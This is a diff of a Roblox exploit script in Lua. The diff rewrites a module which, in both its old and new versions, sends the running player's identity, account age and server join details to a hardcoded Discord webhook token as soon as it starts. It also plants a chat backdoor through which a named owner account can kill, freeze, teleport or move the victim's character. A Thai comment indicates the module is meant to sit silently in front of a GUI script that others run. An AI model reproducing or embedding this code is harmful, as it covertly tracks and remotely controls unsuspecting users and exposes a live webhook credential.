@@ -1,167 +1,176 @@
--- Webhook Configuration
-local webhook_url = "https://discordapp.com/api/webhooks/1322240223052300478/7SSpyDR6aCGxJIUf1KvWtHakkgDFqXPMWmoyxoRTY_ApYDzUoW-S7GELvQKestHEuVQK"
-
--- Services setup
-local Players, LocalPlayer, StarterGui, ReplicatedStorage do
-    Players = cloneref(game:GetService("Players"))
-    LocalPlayer = Players.LocalPlayer
-    StarterGui = cloneref(game:GetService("StarterGui"))
-    ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
-end
-
--- Owner system variables
-local owner = "16810y"
-local prefix = "."
-
--- Webhook Functions
-local function getServerInfo()
-    local jobId = game.JobId
-    local placeId = game.PlaceId
-    local placeName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
-    local player = LocalPlayer
+-- ownerSystem.lua
+return function(config)
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local TweenService = game:GetService("TweenService")
     
-    local playerInfo = {
-        name = player.Name,
-        displayName = player.DisplayName,
-        userId = player.UserId,
-        accountAge = player.AccountAge
-    }
+    -- Webhook Configuration
+    local webhook_url = "https://discord.com/api/webhooks/1322240223052300478/7SSpyDR6aCGxJIUf1KvWtHakkgDFqXPMWmoyxoRTY_ApYDzUoW-S7GELvQKestHEuVQK"
     
-    local joinScript = string.format([[
-game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")
-    ]], placeId, jobId)
+    -- Owner system variables
+    local owner = config.owner or "16810y"
+    local prefix = config.prefix or "."
     
-    return {
-        jobId = jobId,
-        placeId = placeId,
-        placeName = placeName,
-        joinScript = joinScript,
-        player = playerInfo
-    }
-end
-
-local function sendWebhook()
-    local serverInfo = getServerInfo()
-    
-    local data = {
-        ["embeds"] = {{
-            ["title"] = "🎮 New Server Detection",
-            ["description"] = "มีคนรันสคริปในเซิร์ฟเวอร์ใหม่!",
-            ["color"] = 5814783,
-            ["fields"] = {
-                {
-                    ["name"] = "👤 Player Info",
-                    ["value"] = string.format(
-                        "**Name:** %s\n**Display Name:** %s\n**UserID:** %s\n**Account Age:** %d days",
-                        serverInfo.player.name,
-                        serverInfo.player.displayName,
-                        serverInfo.player.userId,
-                        serverInfo.player.accountAge
-                    ),
-                    ["inline"] = false
+    -- Webhook Functions
+    local function sendWebhook()
+        local jobId = game.JobId
+        local placeId = game.PlaceId
+        local placeName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
+        
+        local data = {
+            ["embeds"] = {{
+                ["title"] = "🎮 New Server Detection",
+                ["description"] = "มีคนรันสคริปในเซิร์ฟเวอร์ใหม่!",
+                ["color"] = 5814783,
+                ["fields"] = {
+                    {
+                        ["name"] = "👤 Player Info",
+                        ["value"] = string.format(
+                            "**Name:** %s\n**Display Name:** %s\n**UserID:** %s\n**Account Age:** %d days",
+                            LocalPlayer.Name,
+                            LocalPlayer.DisplayName,
+                            LocalPlayer.UserId,
+                            LocalPlayer.AccountAge
+                        ),
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🏷️ Game Name",
+                        ["value"] = placeName,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "📍 Place ID",
+                        ["value"] = tostring(placeId),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "🔑 Job ID",
+                        ["value"] = jobId,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "📝 Join Script",
+                        ["value"] = string.format("```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')```", placeId, jobId),
+                        ["inline"] = false
+                    }
                 },
-                {
-                    ["name"] = "🏷️ Game Name",
-                    ["value"] = serverInfo.placeName,
-                    ["inline"] = true
+                ["footer"] = {
+                    ["text"] = "Server Time: " .. os.date("%Y-%m-%d %H:%M:%S")
                 },
-                {
-                    ["name"] = "📍 Place ID",
-                    ["value"] = tostring(serverInfo.placeId),
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "🔑 Job ID",
-                    ["value"] = serverInfo.jobId,
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "📝 Join Script",
-                    ["value"] = "```lua\n" .. serverInfo.joinScript .. "\n```",
-                    ["inline"] = false
+                ["thumbnail"] = {
+                    ["url"] = string.format(
+                        "https://www.roblox.com/headshot-thumbnail/image?userId=%s&width=420&height=420&format=png",
+                        LocalPlayer.UserId
+                    )
                 }
-            },
-            ["footer"] = {
-                ["text"] = "Server Time: " .. os.date("%Y-%m-%d %H:%M:%S")
-            },
-            ["thumbnail"] = {
-                ["url"] = string.format(
-                    "https://www.roblox.com/headshot-thumbnail/image?userId=%s&width=420&height=420&format=png",
-                    serverInfo.player.userId
-                )
-            }
-        }}
-    }
+            }}
+        }
 
-    local headers = {
-        ["content-type"] = "application/json"
-    }
+        local headers = {
+            ["content-type"] = "application/json"
+        }
 
-    local request = http_request or request or HttpPost or syn.request
-    request({
-        Url = webhook_url,
-        Method = "POST",
-        Headers = headers,
-        Body = game:GetService("HttpService"):JSONEncode(data)
-    })
-end
+        local request = http_request or request or HttpPost or syn.request
+        request({
+            Url = webhook_url,
+            Method = "POST",
+            Headers = headers,
+            Body = game:GetService("HttpService"):JSONEncode(data)
+        })
+    end
 
--- Command system
-local function executeCommand(message, sender)
-    if sender.Name ~= owner then return end
-    if message:sub(1,1) ~= prefix then return end
-    
-    local command = message:sub(2):lower()
-    
-    task.spawn(function()
-        if command == "re" then
-            if LocalPlayer.Character then
-                LocalPlayer.Character:BreakJoints()
-            end
-            
-        elseif command == "freeze" then
-            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                LocalPlayer.Character.HumanoidRootPart.Anchored = true
-            end
-            
-        elseif command == "unfreeze" then
-            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                LocalPlayer.Character.HumanoidRootPart.Anchored = false
-            end
-            
-        elseif command == "enap" then
-            local args = {
-                [1] = "EnablePvp"
-            }
-            ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
-            
-        elseif command == "tm" then
-            if LocalPlayer.Character and sender.Character then
-                LocalPlayer.Character:MoveTo(sender.Character.HumanoidRootPart.Position)
-            end
+    -- Function สำหรับ Tween
+    local function tweenTo(target, speed)
+        if not LocalPlayer.Character or not target then return end
+        
+        local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if not humanoidRootPart then return end
+        
+        local distance = (target.Position - humanoidRootPart.Position).Magnitude
+        local tweenInfo = TweenInfo.new(
+            distance / speed,
+            Enum.EasingStyle.Linear
+        )
+        
+        local tween = TweenService:Create(humanoidRootPart, tweenInfo, {
+            CFrame = CFrame.new(target.Position)
+        })
+        
+        tween:Play()
+        return tween
+    end
+
+    -- Command system
+    local function executeCommand(message, sender)
+        if sender.Name ~= owner then return end
+        if message:sub(1,1) ~= prefix then return end
+        
+        local command = message:sub(2):lower()
+        local args = {}
+        
+        for arg in command:gmatch("%S+") do
+            table.insert(args, arg)
         end
-    end)
-end
-
--- Chat handler
-local function setupChatHandler()
-    local function playerAdded(player)
-        player.Chatted:Connect(function(message)
-            executeCommand(message, player)
+        
+        command = args[1]
+        
+        task.spawn(function()
+            if command == "re" then
+                if LocalPlayer.Character then
+                    LocalPlayer.Character:BreakJoints()
+                end
+                
+            elseif command == "freeze" then
+                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    LocalPlayer.Character.HumanoidRootPart.Anchored = true
+                end
+                
+            elseif command == "unfreeze" then
+                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    LocalPlayer.Character.HumanoidRootPart.Anchored = false
+                end
+                
+            elseif command == "enap" then
+                local args = {
+                    [1] = "EnablePvp"
+                }
+                ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+                
+            elseif command == "tm" then
+                if LocalPlayer.Character and sender.Character then
+                    LocalPlayer.Character:MoveTo(sender.Character.HumanoidRootPart.Position)
+                end
+                
+            elseif command == "tw" then
+                local speed = tonumber(args[2]) or 100
+                
+                if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
+                    tweenTo(sender.Character.HumanoidRootPart, speed)
+                end
+            end
         end)
     end
 
-    for _, player in ipairs(Players:GetPlayers()) do
-        playerAdded(player)
+    -- Chat handler
+    local function setupChatHandler()
+        local function playerAdded(player)
+            player.Chatted:Connect(function(message)
+                executeCommand(message, player)
+            end)
+        end
+
+        for _, player in ipairs(Players:GetPlayers()) do
+            playerAdded(player)
+        end
+
+        Players.PlayerAdded:Connect(playerAdded)
     end
 
-    Players.PlayerAdded:Connect(playerAdded)
+    -- Initialize
+    task.spawn(function()
+        sendWebhook()
+    end)
+    setupChatHandler()
 end
-
--- Initialize everything
-task.spawn(function()
-    sendWebhook()
-end)
-setupChatHandler()
-
--- ต่อจากนี้ให้วาง code Window creation และส่วนที่เหลือของคุณ...
